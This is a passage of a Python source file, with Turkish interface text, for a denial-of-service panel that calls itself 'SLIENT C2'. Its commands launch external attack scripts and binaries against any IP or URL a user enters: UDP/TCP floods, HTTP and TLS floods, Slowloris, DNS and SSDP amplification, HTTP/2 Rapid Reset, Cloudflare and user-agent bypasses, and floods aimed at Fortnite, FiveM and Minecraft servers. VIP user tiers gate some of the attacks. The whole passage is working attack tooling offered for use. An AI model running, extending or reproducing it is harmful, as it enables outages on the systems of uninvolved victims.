        return
    cmd = ["go", "run", script_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'go' komutu bulunamadı.")

def run_cfpro_script(url, threads, seconds):
    global active_processes
    if not os.path.exists("cf-pro.py"):
        print("[!] cf-pro.py bulunamadı!")
        return
    try:
        proc = subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds]) if CIKTI_GOSTER else subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

def run_node_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["node", script_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'node' komutu bulunamadı.")

def run_c_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        if os.path.exists("tcp.c"):
            print("[*] tcp.c derleniyor...")
            try:
                subprocess.run(["gcc", "tcp.c", "-o", binary_name, "-lpthread"], check=True)
                print("[+] Derleme başarılı.")
            except:
                print("[!] Derleme hatası.")
                return
        else:
            print(f"[!] {binary_name} ve tcp.c bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

def run_perl_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["perl", script_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except FileNotFoundError:
        print("[!] 'perl' komutu bulunamadı.")

def run_go_binary(binary_name, args):
    global active_processes
    if not os.path.exists(binary_name):
        gofile = None
        for f in ["minecraft.go", "rapid.go"]:
            if os.path.exists(f):
                gofile = f
                break
        if gofile:
            print(f"[*] {gofile} derleniyor...")
            try:
                subprocess.run(["go", "build", "-o", binary_name, gofile], check=True)
                print("[+] Derleme başarılı.")
            except:
                print("[!] Derleme hatası.")
                return
        else:
            print(f"[!] {binary_name} ve .go bulunamadı!")
            return
    cmd = ["./" + binary_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Hata: {e}")

# ========== METOD KOMUTLARI (VIP kontrollü) ==========
def cmd_udp(args):
    if len(args) < 3:
        print("[!] Kullanım: udp <ip> <port> <süre>")
        return
    ip, port, duration = args[0], args[1], args[2]
    show_attack_banner(ip, port, duration, "UDP", threads="2048/16384", vip=False)
    history_ekle(ip, port, duration, "UDP", "2048/16384")
    run_script("udp.py", [ip, port, duration])

def cmd_httpflood(args):
    if len(args) < 4:
        print("[!] Kullanım: httpflood <url> <threads> <get/post> <seconds> [header]")
        return
    url, threads, method, seconds = args[0], args[1], args[2].lower(), args[3]
    header = args[4] if len(args) > 4 else "nil"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "HTTP-FLOOD", threads=threads, vip=False)
    history_ekle(url, port, seconds, "HTTP-FLOOD", threads)
    run_go_script("httpflood.go", [url, threads, method, seconds, header])

def cmd_cfpro(args):
    if not check_vip("cfpro"): return
    if len(args) < 3:
        print("[!] Kullanım: cfpro <url> <threads> <seconds>")
        return
    url, threads, seconds = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "CF-PRO", threads=threads, vip=True)
    history_ekle(url, port, seconds, "CF-PRO", threads)
    run_cfpro_script(url, threads, seconds)

def cmd_flood(args):
    if len(args) < 3:
        print("[!] Kullanım: flood <url> <süre> <thread>")
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "FLOOD", threads=threads, vip=False)
    history_ekle(url, port, duration, "FLOOD", threads)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("flood.js", [url, duration, threads, threads, "proxy.txt"])

def cmd_httpraw(args):
    if len(args) < 2:
        print("[!] Kullanım: http-raw <url> <süre>")
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAW", threads=None, vip=False)
    history_ekle(url, port, duration, "HTTP-RAW", "1")
    run_node_script("HTTP-RAW.js", [url, duration])

def cmd_httpsocket(args):
    if len(args) < 3:
        print("[!] Kullanım: http-socket <url> <thread> <süre>")
        return
    url, threads, duration = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-SOCKET", threads=threads, vip=False)
    history_ekle(url, port, duration, "HTTP-SOCKET", threads)
    run_node_script("HTTP-SOCKET.js", [url, threads, duration])

def cmd_httprand(args):
    if len(args) < 2:
        print("[!] Kullanım: http-rand <url> <süre>")
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAND", threads=None, vip=False)
    history_ekle(url, port, duration, "HTTP-RAND", "1")
    run_node_script("HTTP-RAND.js", [url, duration])

def cmd_httpspoof(args):
    if len(args) < 3:
        print("[!] Kullanım: https-spoof <url> <süre> <thread>")
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPS-SPOOF", threads=threads, vip=False)
    history_ekle(url, port, duration, "HTTPS-SPOOF", threads)
    run_script("https-spoof.py", [url, duration, threads])

def cmd_tls(args):
    if len(args) < 3:
        print("[!] Kullanım: tls <url> <süre> <thread>")
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS", threads=threads, vip=False)
    history_ekle(url, port, duration, "TLS", threads)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("tls.js", [url, duration, threads, "GET", "proxy.txt", threads])

def cmd_tls2(args):
    if len(args) < 3:
        print("[!] Kullanım: tls2 <url> <süre> <thread>")
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS-PROXY", threads=threads, vip=False)
    history_ekle(url, port, duration, "TLS-PROXY", threads)
    run_node_script("tls-proxy.js", [url, duration, threads])

def cmd_tls3(args):
    if len(args) < 3:
        print("[!] Kullanım: tls3 <url> <süre> <thread>")
        return
    url, duration, threads = args[0], args[1], args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS3", threads=threads, vip=False)
    history_ekle(url, port, duration, "TLS3", threads)
    run_node_script("tls3.js", [url, duration, threads])

def cmd_httpflood2(args):
    if not check_vip("httpflood2"): return
    if len(args) < 2:
        print("[!] Kullanım: httpflood2 <url> <süre>")
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-FLOOD2", threads="Proxy", vip=True)
    history_ekle(url, port, duration, "HTTP-FLOOD2", "Proxy")
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt bulunamadı!")
        return
    run_node_script("httpflood2.js", [url, duration])

def cmd_slow(args):
    if len(args) < 2:
        print("[!] Kullanım: slow <url> <süre>")
        return
    url, duration = args[0], args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "SLOW", threads="Slowloris", vip=False)
    history_ekle(url, port, duration, "SLOW", "Slowloris")
    run_node_script("slow.js", [url, duration])

def cmd_tcpflood(args):
    if not check_vip("tcpflood"): return
    if len(args) < 6:
        print("[!] Kullanım: tcpflood <IP> <PORT> <THREAD> <TIME> <PPS> <FLAG>")
        return
    ip, port, threads, duration, pps, flag = args[0], args[1], args[2], args[3], args[4], args[5]
    show_attack_banner(ip, port, duration, "TCP-FLOOD", threads=threads, vip=True)
    history_ekle(ip, port, duration, "TCP-FLOOD", threads)
    run_c_binary("tcpflood", [ip, port, threads, duration, pps, flag])

def cmd_fortnite(args):
    if len(args) < 5:
        print("[!] Kullanım: fortnite <IP> <PORT> <SÜRE> <PPS> <PAYLOAD>")
        return
    ip, port, timer, pps, payload = args[0], args[1], args[2], args[3], args[4]
    show_attack_banner(ip, port, timer, "FORTNITE", threads=pps, vip=False)
    history_ekle(ip, port, timer, "FORTNITE", pps)
    run_script("fortnite.py", [ip, port, timer, pps, payload])

def cmd_fivem(args):
    if len(args) < 2:
        print("[!] Kullanım: fivem <IP> <SÜRE>")
        return
    ip, duration = args[0], args[1]
    port = "30120"
    show_attack_banner(ip, port, duration, "FIVEM", threads="Perl", vip=False)
    history_ekle(ip, port, duration, "FIVEM", "Perl")
    run_perl_script("fivem.pl", [ip, duration])

def cmd_browser(args):
    if not check_vip("browser"): return
    if len(args) < 2:
        print("[!] Kullanım: browser <URL> <SÜRE>")
        return
    url, duration = args[0], args[1]
    threads = "1250"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "BROWSER", threads=threads, vip=True)
    history_ekle(url, port, duration, "BROWSER", threads)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("browser.js", [url, duration, threads, "proxy.txt"])

def cmd_minecraft(args):
    if not check_vip("minecraft"): return
    if len(args) < 3:
        print("[!] Kullanım: minecraft <IP> <PORT> <SÜRE>")
        return
    ip, port, duration = args[0], args[1], args[2]
    show_attack_banner(ip, port, duration, "MINECRAFT-GO", threads="1000", vip=True)
    history_ekle(ip, port, duration, "MINECRAFT-GO", "1000")
    run_go_binary("minecraft", [ip, port, duration])

def cmd_dnsamp(args):
    if not check_vip("dnsamp"): return
    if len(args) >= 2:
        target, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] DNS Amplification")
        target = input("  ➤ Hedef: ").strip()
        if not target: return
        duration = input("  ➤ Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  ➤ Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    port = "53"
    show_attack_banner(target, port, duration, "DNS-AMP", threads=threads, vip=True)
    history_ekle(target, port, duration, "DNS-AMP", threads)
    run_script("dnsamp.py", [target, duration, threads])

def cmd_ssdp(args):
    if not check_vip("ssdp"): return
    if len(args) >= 2:
        target, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] SSDP Amplification")
        target = input("  ➤ Hedef IP: ").strip()
        if not target: return
        duration = input("  ➤ Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  ➤ Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    port = "1900"
    show_attack_banner(target, port, duration, "SSDP-AMP", threads=threads, vip=True)
    history_ekle(target, port, duration, "SSDP-AMP", threads)
    run_script("ssdp.py", [target, duration, threads])

def cmd_rapid(args):
    if not check_vip("rapid"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] HTTP/2 Rapid Reset")
        url = input("  ➤ Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "https://" + url
        duration = input("  ➤ Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  ➤ Thread (500): ").strip()
        if not threads.isdigit(): threads = "500"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "H2-RESET", threads=threads, vip=True)
    history_ekle(url, port, duration, "H2-RESET", threads)
    run_go_binary("rapid", [url, duration, threads])

def cmd_uambypass(args):
    if not check_vip("uambypass"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "50"
        proxy_file = args[3] if len(args) > 3 else "proxy.txt"
    else:
        print("\n[?] User-Agent Bypass")
        url = input("  ➤ Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "http://" + url
        duration = input("  ➤ Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  ➤ Thread (50): ").strip()
        if not threads.isdigit(): threads = "50"
        proxy_file = "proxy.txt"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "UABYPASS", threads=threads, vip=True)
    history_ekle(url, port, duration, "UABYPASS", threads)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")
    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

def cmd_httpsbypass(args):
    if not check_vip("httpsbypass"): return
    if len(args) >= 2:
        url, duration = args[0], args[1]
        threads = args[2] if len(args) > 2 else "100"
    else:
        print("\n[?] HTTPS Bypass")
        url = input("  ➤ Hedef URL: ").strip()
        if not url: return
        if not url.startswith("http"): url = "http://" + url
        duration = input("  ➤ Süre: ").strip()
        if not duration.isdigit(): return
        threads = input("  ➤ Thread (100): ").strip()
        if not threads.isdigit(): threads = "100"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPSBYPASS", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTPSBYPASS", threads)
    proxy_file = "proxy.txt"
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")
    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

# ========== THEME + CLEAR ==========
def cmd_theme(args):
    if len(args) < 1:
        tema_listele()
        return
    try:
        tema_no = int(args[0])
        if tema_degistir(tema_no):
            print(f"[+] Tema '{TEMALAR[tema_no]['isim']}' aktif.")
            show_logo_and_boxes()
        else:
            print("[!] Geçersiz tema.")
    except ValueError:
        print("[!] Sayı girin. Örnek: theme 8")

def cmd_clear():
    show_logo_and_boxes()

def cmd_help():
    os.system('clear')
    c = line_palette[0] if line_palette else 196
    r = "\033[0m"
    border = f"\033[38;5;{c}m"
    print(f"{border}╔════════════════════════════════════════════════╗{r}")
    print(f"{border}║          SLIENT C2 KOMUT LİSTESİ              ║{r}")
    print(f"{border}╠════════════════════════════════════════════════╣{r}")
    print(f"{border}║{r}  menu        - Tüm methodları göster          {border}║{r}")
    print(f"{border}║{r}  L7 / L4 / game - Kategori menüleri           {border}║{r}")
    print(f"{border}║{r}  info        - Hedef bilgisi topla             {border}║{r}")
    print(f"{border}║{r}  promptstyle - Prompt stili (1/2/3)            {border}║{r}")
    print(f"{border}║{r}  promptcolor - Prompt renkleri                 {border}║{r}")
    print(f"{border}║{r}  setprompt   - Prompt metni (stil 2)           {border}║{r}")
    print(f"{border}║{r}  theme       - Tema değiştir (1-8)             {border}║{r}")
    print(f"{border}║{r}  history     - Saldırı geçmişi                 {border}║{r}")
    print(f"{border}║{r}  stop        - Tüm saldırıları durdur          {border}║{r}")
    print(f"{border}║{r}  clear       - Ekranı temizle                  {border}║{r}")
    if CURRENT_USER == ADMIN_USER:
        print(f"{border}║{r}  addvip      - VIP kullanıcı ekle (admin)      {border}║{r}")
        print(f"{border}║{r}  delvip      - VIP kullanıcı sil (admin)       {border}║{r}")
        print(f"{border}║{r}  listvip     - VIP listesi (admin)             {border}║{r}")
    print(f"{border}║{r}  exit        - Çıkış                           {border}║{r}")
    print(f"{border}╚════════════════════════════════════════════════╝{r}\n")

# ========== MENÜLER ==========
def cmd_l7():
    cmd_menu()

def cmd_l4():
    cmd_menu()

def cmd_game():
    cmd_menu()

# ========== MAIN ==========
def main():
    if not login():
        return
    show_logo_and_boxes()
    try:
        while True:
            raw = prompt().strip()
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd in ("exit", "quit", "q"):
                break
            elif cmd == "help":
                cmd_help()
            elif cmd == "menu":
                cmd_menu()
            elif cmd in ("l7", "layer7"):
                cmd_l7()
            elif cmd in ("l4", "layer4"):
                cmd_l4()
            elif cmd == "game":
                cmd_game()
            elif cmd == "udp":
                cmd_udp(args)
            elif cmd == "httpflood":
                cmd_httpflood(args)
            elif cmd == "cfpro":
                cmd_cfpro(args)
            elif cmd == "flood":
                cmd_flood(args)
            elif cmd == "http-raw":
                cmd_httpraw(args)
            elif cmd == "http-socket":
                cmd_httpsocket(args)
            elif cmd == "http-rand":
                cmd_httprand(args)
            elif cmd == "https-spoof":
                cmd_httpspoof(args)
            elif cmd == "tls":
                cmd_tls(args)
            elif cmd == "tls2":
                cmd_tls2(args)
            elif cmd == "tls3":
                cmd_tls3(args)
            elif cmd == "httpflood2":
                cmd_httpflood2(args)
            elif cmd == "slow":
                cmd_slow(args)
            elif cmd == "tcpflood":
                cmd_tcpflood(args)
            elif cmd == "fortnite":
                cmd_fortnite(args)
            elif cmd == "fivem":
                cmd_fivem(args)
            elif cmd == "browser":
                cmd_browser(args)
            elif cmd == "minecraft":
                cmd_minecraft(args)
            elif cmd == "dnsamp":
                cmd_dnsamp(args)
            elif cmd == "ssdp":
                cmd_ssdp(args)
            elif cmd == "rapid":
                cmd_rapid(args)
            elif cmd == "uambypass":
                cmd_uambypass(args)
            elif cmd == "httpsbypass":
                cmd_httpsbypass(args)
            elif cmd == "info":
                cmd_info(args)
            elif cmd == "promptstyle":
                cmd_promptstyle(args)
            elif cmd == "setprompt":
                cmd_setprompt(args)
            elif cmd == "promptcolor":
                cmd_promptcolor(args)
            elif cmd == "theme":
                cmd_theme(args)
            elif cmd == "addvip":
                cmd_addvip(args)
            elif cmd == "delvip":
                cmd_delvip(args)
            elif cmd == "listvip":
                cmd_listvip(args)
            elif cmd == "saldırı_goster":
                cmd_cikti_goster()
            elif cmd == "saldırı_kapan":
                cmd_cikti_kapan()
            elif cmd == "stop":
                cmd_stop()
            elif cmd == "clear":
                cmd_clear()
            elif cmd == "history":
                history_listele()
            else:
                print(f"Bilinmeyen komut: '{cmd}'. 'help' yazın.")
    except KeyboardInterrupt:
        print("\nÇıkılıyor...")
        sys.exit(0)

if __name__ == "__main__":
    main()